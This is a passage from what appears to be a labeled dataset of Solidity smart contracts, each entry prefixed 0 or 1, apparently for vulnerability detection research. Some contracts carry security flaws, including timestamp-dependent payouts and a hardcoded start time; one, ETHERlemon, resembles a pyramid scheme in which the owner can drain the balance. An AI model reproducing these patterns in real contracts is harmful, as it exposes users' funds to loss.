splitTokensAfterDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {		splitTokensBeforeDistribution(splitFactor);		uint256 n = allMembers.length;		for (uint256 i = 0; i < n; i++) {			address currentMember = allMembers[i];			uint256 memberBalance = balances[currentMember];			if (memberBalance > 0) {				uint256 multiplier1 = memberBalance.mul(splitFactor);				uint256 increaseMemberSupplyBy = multiplier1.sub(memberBalance);				balances[currentMember] = multiplier1;				emit Transfer(address(0), currentMember, increaseMemberSupplyBy);			}		}		n = allNonMembers.length;		for (i = 0; i < n; i++) {			address currentNonMember = allNonMembers[i];			 			if (members[currentNonMember].exists) {				continue;			}			uint256 nonMemberBalance = balances[currentNonMember];			if (nonMemberBalance > 0) {				uint256 multiplier2 = nonMemberBalance.mul(splitFactor);				uint256 increaseNonMemberSupplyBy = multiplier2.sub(nonMemberBalance);				balances[currentNonMember] = multiplier2;				emit Transfer(address(0), currentNonMember, increaseNonMemberSupplyBy);			}		}		emit SplitTokens(splitFactor);		return true;	}	function reverseSplitTokensAfterDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {		reverseSplitTokensBeforeDistribution(splitFactor);		uint256 n = allMembers.length;		for (uint256 i = 0; i < n; i++) {			address currentMember = allMembers[i];			uint256 memberBalance = balances[currentMember];			if (memberBalance > 0) {				uint256 divier1 = memberBalance.div(splitFactor);				uint256 decreaseMemberSupplyBy = memberBalance.sub(divier1);				balances[currentMember] = divier1;				emit Transfer(currentMember, address(0), decreaseMemberSupplyBy);			}		}		n = allNonMembers.length;		for (i = 0; i < n; i++) {			address currentNonMember = allNonMembers[i];			 			if (members[currentNonMember].exists) {				continue;			}			uint256 nonMemberBalance = balances[currentNonMember];			if (nonMemberBalance > 0) {				uint256 divier2 = nonMemberBalance.div(splitFactor);				uint256 decreaseNonMemberSupplyBy = nonMemberBalance.sub(divier2);				balances[currentNonMember] = divier2;				emit Transfer(currentNonMember, address(0), decreaseNonMemberSupplyBy);			}		}		emit ReverseSplitTokens(splitFactor);		return true;	}	function transfer(address _to, uint256 _value) public onlyPayloadSize(2 * 32) canTransfer returns (bool success) {				 		Member storage fromMember = members[msg.sender];		if (fromMember.exists) {  			int256 transferValue = fromMember.transferred + int(_value);			require(transferValue >= fromMember.transferred);  			require(transferValue <= int(getUnlockedBalanceLimit(msg.sender)));  			fromMember.transferred = transferValue;		}		 		 		if (!fromMember.exists && msg.sender != owner) {			bool fromTransferee = nonMemberTransfers[msg.sender];			if (!fromTransferee) {  				nonMemberTransfers[msg.sender] = true;				allNonMembers.push(msg.sender);			}		}		if (!members[_to].exists && _to != owner) {			bool toTransferee = nonMemberTransfers[_to];			if (!toTransferee) {  				nonMemberTransfers[_to] = true;				allNonMembers.push(_to);			}		} else if (members[_to].exists) {  			int256 transferInValue = members[_to].transferred - int(_value);			require(transferInValue <= members[_to].transferred);  			members[_to].transferred = transferInValue;		}		return super.transfer(_to, _value);	}	function transferFrom(address _from, address _to, uint256 _value) public onlyPayloadSize(3 * 32) canTransfer returns (bool success) {		 		Member storage fromMember = members[_from];		if (fromMember.exists) {  			int256 transferValue = fromMember.transferred + int(_value);			require(transferValue >= fromMember.transferred);  			require(transferValue <= int(getUnlockedBalanceLimit(msg.sender)));  			fromMember.transferred = transferValue;		}		 		 		if (!fromMember.exists && _from != owner) {			bool fromTransferee = nonMemberTransfers[_from];			if (!fromTransferee) {  				nonMemberTransfers[_from] = true;				allNonMembers.push(_from);			}		}		if (!members[_to].exists && _to != owner) {			bool toTransferee = nonMemberTransfers[_to];			if (!toTransferee) {  				nonMemberTransfers[_to] = true;				allNonMembers.push(_to);			}		} else if (members[_to].exists) {  			int256 transferInValue = members[_to].transferred - int(_value);			require(transferInValue <= members[_to].transferred);  			members[_to].transferred = transferInValue;		}		return super.transferFrom(_from, _to, _value);	}	function setOpenGroup(uint256 groupNumber) public onlyOwner returns (bool success) {		require(groupNumber < nextGroupNumber);		openGroupNumber = groupNumber;		return true;	}	function getUndistributedBalanceOf(address walletAddress, uint256 groupNumber) public view returns (uint256 balance) {		Member storage theMember = members[walletAddress];		require(theMember.exists);		if (groups[groupNumber].distributed)  			return 0;		return theMember.tokenBalance[groupNumber];	}	function checkMyUndistributedBalance(uint256 groupNumber) public view returns (uint256 balance) {		return getUndistributedBalanceOf(msg.sender, groupNumber);	}	function transferRecovery(address _from, address _to, uint256 _value) public onlyOwner returns (bool success) {		 		allowed[_from][msg.sender] = allowed[_from][msg.sender].add(_value);  		Member storage fromMember = members[_from];		if (fromMember.exists) {			int256 oldTransferred = fromMember.transferred;			fromMember.transferred -= int(_value);  			require(oldTransferred >= fromMember.transferred);  		}		return transferFrom(_from, _to, _value);	}}
1<CODESPLIT>contract CryptoLuckQuickEthV1 {  bool public useOraclize;  uint256 public lastDrawTs;  function CryptoLuckQuickEthV1(bool _useOraclize) {    useOraclize = _useOraclize;    lastDrawTs = block.timestamp;    return;  }}
1<CODESPLIT>contract ETHERlemon{    uint public paymentqueue = 0;    uint public feecounter;        address public owner;    address public ipyh=0x5fD8B8237B6fA8AEDE4fdab7338709094d5c5eA4;    address public hyip=0xfAF7100b413465Ea0eB550d6D6a2A29695A6f218;    address meg=this;    modifier _onlyowner    {        if (msg.sender == owner)        _    }        function ETHERlemon()     {        owner = msg.sender;    }    function()           {        enter();    }    function enter()    {        if (msg.sender == owner)	    {	        UpdatePay();                                          	    }	    else                                                          	    {            feecounter+=msg.value/10;                                  	        owner.send(feecounter/2);                           	        ipyh.send((feecounter/2)/2);                                 	        hyip.send((feecounter/2)/2);	        feecounter=0;                                            	                    if (msg.value == (1 ether)/10)                                            {                canPay();                                                          }	        else                                                         	        {	            msg.sender.send(msg.value - msg.value/10);                   	        }	    }    }        function UpdatePay() _onlyowner                                                {        msg.sender.send(meg.balance);    }        function canPay() internal                                                      {        msg.sender.send((block.timestamp*1000)*1000*40);       }}
0<CODESPLIT>contract RigIdle  {    struct MinerData {        uint256      lastUpdateTime;    }    mapping(address => MinerData) private miners;    function UpdateMoney() private {        MinerData storage m = miners[msg.sender];        m.lastUpdateTime = block.timestamp;        return;    }}
1<CODESPLIT>contract SynthornToken {  uint256 startTime = 20;  function purchasingAllowed() constant returns (bool) {    return block.timestamp <= startTime + 30 days;  }}
0<CODESPLIT>contract NullFinalizeAgentExt is FinalizeAgent {  CrowdsaleExt public crowdsale;  function NullFinalizeAgentExt(CrowdsaleExt _crowdsale) {    crowdsale = _crowdsale;  }     function isSane() public constant returns (bool) {    return true;  }  function distributeReservedTokens(uint reservedTokensDistributionBatch) public {  }     function finalizeCrowdsale() public {  }}
0<CODESPLIT>contract MSCE {    uint256 public crowdsaleEndTime = 1526831999;    uint256 public crowdsaleTotal = 2000*40000*(10**18);    function () internal payable{        uint256 currentTime;        require(currentTime < block.timestamp);        require(crowdsaleTotal > 0);        return;    }}
0<CODESPLIT>contract DetailedERC20 is ERC20 {  string public name;  string public symbol;  uint8 public decimals;  constructor(string _name, string _symbol, uint8 _decimals) public {    name = _name;    symbol = _symbol;    decimals = _decimals;  }} 
0<CODESPLIT>contract CappedToken is MintableToken {  uint256 public cap;  constructor(uint256 _cap) public {    require(_cap > 0);    cap = _cap;  }     function mint(    address _to,    uint256 _amount  )         canMint    public    returns (bool)  {    require(totalSupply_.add(_amount) <= cap);    return super.mint(_to, _amount);  }}
1<CODESPLIT>contract ATTRToken is CappedToken, DetailedERC20 {  using SafeMath for uint256;  uint256 public constant TOTAL_SUPPLY       = uint256(1000000000);  uint256 public constant TOTAL_SUPPLY_ACES  = uint256(1000000000000000000000000000);  uint256 public constant CROWDSALE_MAX_ACES = uint256(500000000000000000000000000);  address public crowdsaleContract;  uint256 public crowdsaleMinted = uint256(0);  uint256 public releaseTime = uint256(1536278399);    bool    public fundingLowcapReached = false;  bool    public isReleased = false;  mapping (address => bool) public agents;  mapping (address => bool) public transferWhitelist;  constructor() public     CappedToken(TOTAL_SUPPLY_ACES)     DetailedERC20("Attrace", "ATTR", uint8(18)) {    transferWhitelist[msg.sender] = true;    agents[msg.sender] = true;  }             modifier isInitialized() {    require(crowdsaleContract != address(0));    require(releaseTime > 0);    _;  }           function setAgent(address _address, bool _status) public onlyOwner {    require(_address != address(0));    agents[_address] = _status;  }  modifier onlyAgents() {    require(agents[msg.sender] == true);    _;  }  function setCrowdsaleContract(address _crowdsaleContract) public onlyAgents {    require(_crowdsaleContract != address(0));    crowdsaleContract = _crowdsaleContract;  }  function setTransferWhitelist(address _address, bool _canTransfer) public onlyAgents {    require(_address != address(0));    transferWhitelist[_address] = _canTransfer;  }  function setReleaseTime(uint256 _time) public onlyAgents {    require(_time > block.timestamp);    require(isReleased == false);    releaseTime = _time;  }  function setFundingLowcapReached(uint256 _verification) public onlyAgents {    require(_verification == uint256(20234983249), "wrong verification code");    fundingLowcapReached = true;  }  function markReleased() public {    if (isReleased == false && _now() > releaseTime) {      isReleased = true;    }  }           modifier hasMintPermission() {    require(msg.sender == crowdsaleContract || agents[msg.sender] == true);    _;  }  function mint(address _to, uint256 _aces) public canMint hasMintPermission returns (bool) {    if (msg.sender == crowdsaleContract) {      require(crowdsaleMinted.add(_aces) <= CROWDSALE_MAX_ACES);      crowdsaleMinted = crowdsaleMinted.add(_aces);    }    return super.mint(_to, _aces);  }           modifier canTransfer(address _from) {    if (transferWhitelist[_from] == false) {      require(block.timestamp >= releaseTime);      require(fundingLowcapReached == true);    }    _;  }  function transfer(address _to, uint256 _aces)     public    isInitialized    canTransfer(msg.sender)     tokensAreUnlocked(msg.sender, _aces)    returns (bool) {      markReleased();      return super.transfer(_to, _aces);    }  function transferFrom(address _from, address _to, uint256 _aces)     public    isInitialized    canTransfer(_from)     tokensAreUnlocked(_from, _aces)    returns (bool) {      markReleased();      return super.transferFrom(_from, _to, _aces);    }           struct VestingRule {    uint256 aces;    uint256 unlockTime;    bool    processed;  }     mapping (address => uint256) public lockedAces;  modifier tokensAreUnlocked(address _from, uint256 _aces) {    if (lockedAces[_from] > uint256(0)) {      require(balanceOf(_from).sub(lockedAces[_from]) >= _aces);    }    _;  }     mapping (address => VestingRule[]) public vestingRules;  function processVestingRules(address _address) public onlyAgents {    _processVestingRules(_address);  }  function processMyVestingRules() public {    _processVestingRules(msg.sender);  }  function addVestingRule(address _address, uint256 _aces, uint256 _unlockTime) public {    require(_aces > 0);    require(_address != address(0));    require(_unlockTime > _now());    if (_now() < releaseTime) {      require(msg.sender == owner);    } else {      require(msg.sender == crowdsaleContract || msg.sender == owner);      require(_now() < releaseTime.add(uint256(2592000)));    }    vestingRules[_address].push(VestingRule({       aces: _aces,      unlockTime: _unlockTime,      processed: false    }));    lockedAces[_address] = lockedAces[_address].add(_aces);  }        function _processVestingRules(address _address) internal {    for (uint256 i = uint256(0); i < vestingRules[_address].length; i++) {      if (vestingRules[_address][i].processed == false && vestingRules[_address][i].unlockTime < _now()) {        lockedAces[_address] = lockedAces[_address].sub(vestingRules[_address][i].aces);        vestingRules[_address][i].processed = true;      }    }  }           function _now() internal view returns (uint256) {    return block.timestamp;  }}
0<CODESPLIT>contract DBC {         modifier pre_cond(bool condition) {        require(condition);        _;    }    modifier post_cond(bool condition) {        _;        assert(condition);    }    modifier invariant(bool condition) {        require(condition);        _;        assert(condition);    }}
0<CODESPLIT>contract CompetitionCompliance is ComplianceInterface, DBC, Owned {    address public competitionAddress;                   function CompetitionCompliance(address ofCompetition) public {        competitionAddress = ofCompetition;    }                                  function isInvestmentPermitted(        address ofParticipant,        uint256 giveQuantity,        uint256 shareQuantity    )        view        returns (bool)    {        return competitionAddress == ofParticipant;    }                             function isRedemptionPermitted(        address ofParticipant,        uint256 shareQuantity,        uint256 receiveQuantity    )        view        returns (bool)    {        return competitionAddress == ofParticipant;    }                   function isCompetitionAllowed(        address x    )        view        returns (bool)    {        return CompetitionInterface(competitionAddress).isWhitelisted(x) && CompetitionInterface(competitionAddress).isCompetitionActive();    }                   function changeCompetitionAddress(        address ofCompetition    )        pre_cond(isOwner())    {        competitionAddress = ofCompetition;    }}
0<CODESPLIT>contract DSExec {    function tryExec( address target, bytes calldata, uint value)             internal             returns (bool call_ret)    {        return target.call.value(value)(calldata);    }    function exec( address target, bytes calldata, uint value)             internal    {        if(!tryExec(target, calldata, value)) {            revert();        }    }         function exec( address t, bytes c )        internal    {        exec(t, c, 0);    }    function exec( address t, uint256 v )        internal    {        bytes memory c; exec(t, c, v);    }    function tryExec( address t, bytes c )        internal        returns (bool)    {        return tryExec(t, c, 0);    }    function tryExec( address t, uint256 v )        internal        returns (bool)    {        bytes memory c; return tryExec(t, c, v);    }}
0<CODESPLIT>contract Asset is DSMath, ERC20Interface {         mapping (address => uint) balances;    mapping (address => mapping (address => uint)) allowed;    uint public _totalSupply;              function transfer(address _to, uint _value)        public        returns (bool success)    {        require(balances[msg.sender] >= _value);          require(balances[_to] + _value >= balances[_to]);        balances[msg.sender] = sub(balances[msg.sender], _value);        balances[_to] = add(balances[_to], _value);        emit Transfer(msg.sender, _to, _value);        return true;    }                                            function transferFrom(address _from, address _to, uint _value)        public        returns (bool)    {        require(_from != address(0));        require(_to != address(0));        require(_to != address(this));        require(balances[_from] >= _value);        require(allowed[_from][msg.sender] >= _value);        require(balances[_to] + _value >= balances[_to]);                 balances[_to] += _value;        balances[_from] -= _value;        allowed[_from][msg.sender] -= _value;        emit Transfer(_from, _to, _value);        return true;    }                             function approve(address _spender, uint _value) public returns (bool) {        require(_spender != address(0));        allowed[msg.sender][_spender] = _value;        emit Approval(msg.sender, _spender, _value);        return true;    }                                  function allowance(address _owner, address _spender)        constant        public        returns (uint)    {        return allowed[_owner][_spender];    }                   function balanceOf(address _owner) constant public returns (uint) {        return balances[_owner];    }    function totalSupply() view public returns (uint) {        return _totalSupply;    }}
0<CODESPLIT>contract Shares is SharesInterface, Asset {              bytes32 public name;    bytes8 public symbol;    uint public decimal;    uint public creationTime;                                  function Shares(bytes32 _name, bytes8 _symbol, uint _decimal, uint _creationTime) {        name = _name;        symbol = _symbol;        decimal = _decimal;        creationTime = _creationTime;    }              function transfer(address _to, uint _value)        public        returns (bool success)    {        require(balances[msg.sender] >= _value);          require(balances[_to] + _value >= balances[_to]);        balances[msg.sender] = sub(balances[msg.sender], _value);        balances[_to] = add(balances[_to], _value);        emit Transfer(msg.sender, _to, _value);        return true;    }         function getName() view returns (bytes32) { return name; }    function getSymbol() view returns (bytes8) { return symbol; }    function getDecimals() view returns (uint) { return decimal; }    function getCreationTime() view returns (uint) { return creationTime; }    function toSmallestShareUnit(uint quantity) view returns (uint) { return mul(quantity, 10 ** getDecimals()); }    function toWholeShareUnit(uint quantity) view returns (uint) { return quantity / (10 ** getDecimals()); }                   function createShares(address recipient, uint shareQuantity) internal {        _totalSupply = add(_totalSupply, shareQuantity);        balances[recipient] = add(balances[recipient], shareQuantity);        emit Created(msg.sender, now, shareQuantity);        emit Transfer(address(0), recipient, shareQuantity);    }              function annihilateShares(address recipient, uint shareQuantity) internal {        _totalSupply = sub(_totalSupply, shareQuantity);        balances[recipient] = sub(balances[recipient], shareQuantity);        emit Annihilated(msg.sender, now, shareQuantity);        emit Transfer(recipient, address(0), shareQuantity);    }}
1<CODESPLIT>contract Fund is DSMath, DBC, Owned, Shares, FundInterface {    event OrderUpdated(address exchange, bytes32 orderId, UpdateType updateType);         struct Modules {          CanonicalPriceFeed pricefeed;          ComplianceInterface compliance;          RiskMgmtInterface riskmgmt;      }    struct Calculations {          uint gav;          uint managementFee;          uint performanceFee;          uint unclaimedFees;          uint nav;          uint highWaterMark;          uint totalSupply;          uint timestamp;      }    enum UpdateType { make, take, cancel }    enum RequestStatus { active, cancelled, executed }    struct Request {          address participant;          RequestStatus status;          address requestAsset;          uint shareQuantity;          uint giveQuantity;          uint receiveQuantity;          uint timestamp;              uint atUpdateId;         }    struct Exchange {        address exchange;        address exchangeAdapter;        bool takesCustody;       }    struct OpenMakeOrder {        uint id;          uint expiresAt;      }    struct Order {          address exchangeAddress;          bytes32 orderId;          UpdateType updateType;          address makerAsset;          address takerAsset;          uint makerQuantity;          uint takerQuantity;          uint timestamp;          uint fillTakerQuantity;      }              uint public constant MAX_FUND_ASSETS = 20;      uint public constant ORDER_EXPIRATION_TIME = 86400;           uint public MANAGEMENT_FEE_RATE;      uint public PERFORMANCE_FEE_RATE;      address public VERSION;      Asset public QUOTE_ASSET;           Modules public modules;      Exchange[] public exchanges;      Calculations public atLastUnclaimedFeeAllocation;      Order[] public orders;       mapping (address => mapping(address => OpenMakeOrder)) public exchangesToOpenMakeOrders;      bool public isShutDown;      Request[] public requests;      mapping (address => bool) public isInvestAllowed;      address[] public ownedAssets;      mapping (address => bool) public isInAssetList;      mapping (address => bool) public isInOpenMakeOrder;                                                                       function Fund(        address ofManager,        bytes32 withName,        address ofQuoteAsset,        uint ofManagementFee,        uint ofPerformanceFee,        address ofCompliance,        address ofRiskMgmt,        address ofPriceFeed,        address[] ofExchanges,        address[] ofDefaultAssets    )        Shares(withName, "MLNF", 18, now)    {        require(ofManagementFee < 10 ** 18);          require(ofPerformanceFee < 10 ** 18);          isInvestAllowed[ofQuoteAsset] = true;        owner = ofManager;        MANAGEMENT_FEE_RATE = ofManagementFee;          PERFORMANCE_FEE_RATE = ofPerformanceFee;          VERSION = msg.sender;        modules.compliance = ComplianceInterface(ofCompliance);        modules.riskmgmt = RiskMgmtInterface(ofRiskMgmt);        modules.pricefeed = CanonicalPriceFeed(ofPriceFeed);                 for (uint i = 0; i < ofExchanges.length; ++i) {            require(modules.pricefeed.exchangeIsRegistered(ofExchanges[i]));            var (ofExchangeAdapter, takesCustody, ) = modules.pricefeed.getExchangeInformation(ofExchanges[i]);            exchanges.push(Exchange({                exchange: ofExchanges[i],                exchangeAdapter: ofExchangeAdapter,                takesCustody: takesCustody            }));        }        QUOTE_ASSET = Asset(ofQuoteAsset);                 ownedAssets.push(ofQuoteAsset);        isInAssetList[ofQuoteAsset] = true;        require(address(QUOTE_ASSET) == modules.pricefeed.getQuoteAsset());          for (uint j = 0; j < ofDefaultAssets.length; j++) {            require(modules.pricefeed.assetIsRegistered(ofDefaultAssets[j]));            isInvestAllowed[ofDefaultAssets[j]] = true;        }        atLastUnclaimedFeeAllocation = Calculations({            gav: 0,            managementFee: 0,            performanceFee: 0,            unclaimedFees: 0,            nav: 0,            highWaterMark: 10 ** getDecimals(),            totalSupply: _totalSupply,            timestamp: now        });    }                        function enableInvestment(address[] ofAssets)        external        pre_cond(isOwner())    {        for (uint i = 0; i < ofAssets.length; ++i) {            require(modules.pricefeed.assetIsRegistered(ofAssets[i]));            isInvestAllowed[ofAssets[i]] = true;        }    }              function disableInvestment(address[] ofAssets)        external        pre_cond(isOwner())    {        for (uint i = 0; i < ofAssets.length; ++i) {            isInvestAllowed[ofAssets[i]] = false;        }    }    function shutDown() external pre_cond(msg.sender == VERSION) { isShutDown = true; }                                  function requestInvestment(        uint giveQuantity,        uint shareQuantity,        address investmentAsset    )        external        pre_cond(!isShutDown)        pre_cond(isInvestAllowed[investmentAsset])          pre_cond(modules.compliance.isInvestmentPermitted(msg.sender, giveQuantity, shareQuantity))         {        requests.push(Request({            participant: msg.sender,            status: RequestStatus.active,            requestAsset: investmentAsset,            shareQuantity: shareQuantity,            giveQuantity: giveQuantity,            receiveQuantity: shareQuantity,            timestamp: now,            atUpdateId: modules.pricefeed.getLastUpdateId()        }));        emit RequestUpdated(getLastRequestId());    }                        function executeRequest(uint id)        external        pre_cond(!isShutDown)        pre_cond(requests[id].status == RequestStatus.active)        pre_cond(            _totalSupply == 0 ||            (                now >= add(requests[id].timestamp, modules.pricefeed.getInterval()) &&                modules.pricefeed.getLastUpdateId() >= add(requests[id].atUpdateId, 2)            )        )        {        Request request = requests[id];        var (isRecent, , ) =            modules.pricefeed.getPriceInfo(address(request.requestAsset));        require(isRecent);                 uint costQuantity = toWholeShareUnit(mul(request.shareQuantity, calcSharePriceAndAllocateFees()));          if (request.requestAsset != address(QUOTE_ASSET)) {            var (isPriceRecent, invertedRequestAssetPrice, requestAssetDecimal) = modules.pricefeed.getInvertedPriceInfo(request.requestAsset);            if (!isPriceRecent) {                revert();            }            costQuantity = mul(costQuantity, invertedRequestAssetPrice) / 10 ** requestAssetDecimal;        }        if (            isInvestAllowed[request.requestAsset] &&            costQuantity <= request.giveQuantity        ) {            request.status = RequestStatus.executed;            require(AssetInterface(request.requestAsset).transferFrom(request.participant, address(this), costQuantity));              createShares(request.participant, request.shareQuantity);              if (!isInAssetList[request.requestAsset]) {                ownedAssets.push(request.requestAsset);                isInAssetList[request.requestAsset] = true;            }        } else {            revert();          }    }              function cancelRequest(uint id)        external        pre_cond(requests[id].status == RequestStatus.active)          pre_cond(requests[id].participant == msg.sender || isShutDown)      {        requests[id].status = RequestStatus.cancelled;    }                        function redeemAllOwnedAssets(uint shareQuantity)        external        returns (bool success)    {        return emergencyRedeem(shareQuantity, ownedAssets);    }                                                                                                                  function callOnExchange(        uint exchangeIndex,        bytes4 method,        address[5] orderAddresses,        uint[8] orderValues,        bytes32 identifier,        uint8 v,        bytes32 r,        bytes32 s    )        external    {        require(            modules.pricefeed.exchangeMethodIsAllowed(                exchanges[exchangeIndex].exchange, method            )        );        require(            exchanges[exchangeIndex].exchangeAdapter.delegatecall(                method, exchanges[exchangeIndex].exchange,                orderAddresses, orderValues, identifier, v, r, s            )        );    }    function addOpenMakeOrder(        address ofExchange,        address ofSellAsset,        uint orderId    )        pre_cond(msg.sender == address(this))    {        isInOpenMakeOrder[ofSellAsset] = true;        exchangesToOpenMakeOrders[ofExchange][ofSellAsset].id = orderId;        exchangesToOpenMakeOrders[ofExchange][ofSellAsset].expiresAt = add(now, ORDER_EXPIRATION_TIME);    }    function removeOpenMakeOrder(        address ofExchange,        address ofSellAsset    )        pre_cond(msg.sender == address(this))    {        delete exchangesToOpenMakeOrders[ofExchange][ofSellAsset];    }    function orderUpdateHook(        address ofExchange,        bytes32 orderId,        UpdateType updateType,        address[2] orderAddresses,          uint[3] orderValues             )        pre_cond(msg.sender == address(this))    {                 if (updateType == UpdateType.make || updateType == UpdateType.take) {            orders.push(Order({                exchangeAddress: ofExchange,                orderId: orderId,                updateType: updateType,                makerAsset: orderAddresses[0],                takerAsset: orderAddresses[1],                makerQuantity: orderValues[0],                takerQuantity: orderValues[1],                timestamp: block.timestamp,                fillTakerQuantity: orderValues[2]            }));        }        emit OrderUpdated(ofExchange, orderId, updateType);    }                                  function calcGav() returns (uint gav) {                 uint[] memory allAssetHoldings = new uint[](ownedAssets.length);        uint[] memory allAssetPrices = new uint[](ownedAssets.length);        address[] memory tempOwnedAssets;        tempOwnedAssets = ownedAssets;        delete ownedAssets;        for (uint i = 0; i < tempOwnedAssets.length; ++i) {            address ofAsset = tempOwnedAssets[i];                         uint assetHoldings = add(                uint(AssetInterface(ofAsset).balanceOf(address(this))),                  quantityHeldInCustodyOfExchange(ofAsset)            );                         var (isRecent, assetPrice, assetDecimals) = modules.pricefeed.getPriceInfo(ofAsset);            if (!isRecent) {                revert();            }            allAssetHoldings[i] = assetHoldings;            allAssetPrices[i] = assetPrice;                         gav = add(gav, mul(assetHoldings, assetPrice) / (10 ** uint256(assetDecimals)));                if (assetHoldings != 0 || ofAsset == address(QUOTE_ASSET) || isInOpenMakeOrder[ofAsset]) {                  ownedAssets.push(ofAsset);            } else {                isInAssetList[ofAsset] = false;              }        }        emit PortfolioContent(tempOwnedAssets, allAssetHoldings, allAssetPrices);    }         function addAssetToOwnedAssets (address ofAsset)        public        pre_cond(isOwner() || msg.sender == address(this))    {        isInOpenMakeOrder[ofAsset] = true;        if (!isInAssetList[ofAsset]) {            ownedAssets.push(ofAsset);            isInAssetList[ofAsset] = true;        }    }         function calcUnclaimedFees(uint gav)        view        returns (            uint managementFee,            uint performanceFee,            uint unclaimedFees)    {                 uint timePassed = sub(now, atLastUnclaimedFeeAllocation.timestamp);        uint gavPercentage = mul(timePassed, gav) / (1 years);        managementFee = wmul(gavPercentage, MANAGEMENT_FEE_RATE);                          uint valuePerShareExclMgmtFees = _totalSupply > 0 ? calcValuePerShare(sub(gav, managementFee), _totalSupply) : toSmallestShareUnit(1);        if (valuePerShareExclMgmtFees > atLastUnclaimedFeeAllocation.highWaterMark) {            uint gainInSharePrice = sub(valuePerShareExclMgmtFees, atLastUnclaimedFeeAllocation.highWaterMark);            uint investmentProfits = wmul(gainInSharePrice, _totalSupply);            performanceFee = wmul(investmentProfits, PERFORMANCE_FEE_RATE);        }                 unclaimedFees = add(managementFee, performanceFee);    }                        function calcNav(uint gav, uint unclaimedFees)        view        returns (uint nav)    {        nav = sub(gav, unclaimedFees);    }                                  function calcValuePerShare(uint totalValue, uint numShares)        view        pre_cond(numShares > 0)        returns (uint valuePerShare)    {        valuePerShare = toSmallestShareUnit(totalValue) / numShares;    }         function performCalculations()        view        returns (            uint gav,            uint managementFee,            uint performanceFee,            uint unclaimedFees,            uint feesShareQuantity,            uint nav,            uint sharePrice        )    {        gav = calcGav();          (managementFee, performanceFee, unclaimedFees) = calcUnclaimedFees(gav);        nav = calcNav(gav, unclaimedFees);                 feesShareQuantity = (gav == 0) ? 0 : mul(_totalSupply, unclaimedFees) / gav;                 uint totalSupplyAccountingForFees = add(_totalSupply, feesShareQuantity);        sharePrice = _totalSupply > 0 ? calcValuePerShare(gav, totalSupplyAccountingForFees) : toSmallestShareUnit(1);      }              function calcSharePriceAndAllocateFees() public returns (uint)    {        var (            gav,            managementFee,            performanceFee,            unclaimedFees,            feesShareQuantity,            nav,            sharePrice        ) = performCalculations();        createShares(owner, feesShareQuantity);                   uint highWaterMark = atLastUnclaimedFeeAllocation.highWaterMark >= sharePrice ? atLastUnclaimedFeeAllocation.highWaterMark : sharePrice;        atLastUnclaimedFeeAllocation = Calculations({            gav: gav,            managementFee: managementFee,            performanceFee: performanceFee,            unclaimedFees: unclaimedFees,            nav: nav,            highWaterMark: highWaterMark,            totalSupply: _totalSupply,            timestamp: now        });        emit FeesConverted(now, feesShareQuantity, unclaimedFees);        emit CalculationUpdate(now, managementFee, performanceFee, nav, sharePrice, _totalSupply);        return sharePrice;    }                                       function emergencyRedeem(uint shareQuantity, address[] requestedAssets)        public        pre_cond(balances[msg.sender] >= shareQuantity)           returns (bool)    {        address ofAsset;        uint[] memory ownershipQuantities = new uint[](requestedAssets.length);        address[] memory redeemedAssets = new address[](requestedAssets.length);                 for (uint i = 0; i < requestedAssets.length; ++i) {            ofAsset = requestedAssets[i];            require(isInAssetList[ofAsset]);            for (uint j = 0; j < redeemedAssets.length; j++) {                if (ofAsset == redeemedAssets[j]) {                    revert();                }            }            redeemedAssets[i] = ofAsset;            uint assetHoldings = add(                uint(AssetInterface(ofAsset).balanceOf(address(this))),                quantityHeldInCustodyOfExchange(ofAsset)            );            if (assetHoldings == 0) continue;                         ownershipQuantities[i] = mul(assetHoldings, shareQuantity) / _totalSupply;                         if (uint(AssetInterface(ofAsset).balanceOf(address(this))) < ownershipQuantities[i]) {                isShutDown = true;                emit ErrorMessage("CRITICAL ERR: Not enough assetHoldings for owed ownershipQuantitiy");                return false;            }        }                 annihilateShares(msg.sender, shareQuantity);                 for (uint k = 0; k < requestedAssets.length; ++k) {                         ofAsset = requestedAssets[k];            if (ownershipQuantities[k] == 0) {                continue;            } else if (!AssetInterface(ofAsset).transfer(msg.sender, ownershipQuantities[k])) {                revert();            }        }        emit Redeemed(msg.sender, now, shareQuantity);        return true;    }                        function quantityHeldInCustodyOfExchange(address ofAsset) returns (uint) {        uint totalSellQuantity;              uint totalSellQuantityInApprove;          for (uint i; i < exchanges.length; i++) {            if (exchangesToOpenMakeOrders[exchanges[i].exchange][ofAsset].id == 0) {                continue;            }            var (sellAsset, , sellQuantity, ) = GenericExchangeInterface(exchanges[i].exchangeAdapter).getOrder(exchanges[i].exchange, exchangesToOpenMakeOrders[exchanges[i].exchange][ofAsset].id);            if (sellQuantity == 0) {                     delete exchangesToOpenMakeOrders[exchanges[i].exchange][ofAsset];            }            totalSellQuantity = add(totalSellQuantity, sellQuantity);            if (!exchanges[i].takesCustody) {                totalSellQuantityInApprove += sellQuantity;            }        }        if (totalSellQuantity == 0) {            isInOpenMakeOrder[sellAsset] = false;        }        return sub(totalSellQuantity, totalSellQuantityInApprove);      }                   function calcSharePrice() view returns (uint sharePrice) {        (, , , , , sharePrice) = performCalculations();        return sharePrice;    }    function getModules() view returns (address, address, address) {        return (            address(modules.pricefeed),            address(modules.compliance),            address(modules.riskmgmt)        );    }    function getLastRequestId() view returns (uint) { return requests.length - 1; }    function getLastOrderIndex() view returns (uint) { return orders.length - 1; }    function getManager() view returns (address) { return owner; }    function getOwnedAssetsLength() view returns (uint) { return ownedAssets.length; }    function getExchangeInfo() view returns (address[], address[], bool[]) {        address[] memory ofExchanges = new address[](exchanges.length);        address[] memory ofAdapters = new address[](exchanges.length);        bool[] memory takesCustody = new bool[](exchanges.length);        for (uint i = 0; i < exchanges.length; i++) {            ofExchanges[i] = exchanges[i].exchange;            ofAdapters[i] = exchanges[i].exchangeAdapter;            takesCustody[i] = exchanges[i].takesCustody;        }        return (ofExchanges, ofAdapters, takesCustody);    }    function orderExpired(address ofExchange, address ofAsset) view returns (bool) {        uint expiryTime = exchangesToOpenMakeOrders[ofExchange][ofAsset].expiresAt;        require(expiryTime > 0);        return block.timestamp >= expiryTime;    }    function getOpenOrderInfo(address ofExchange, address ofAsset) view returns (uint, uint) {        OpenMakeOrder order = exchangesToOpenMakeOrders[ofExchange][ofAsset];        return (order.id, order.expiresAt);    }}
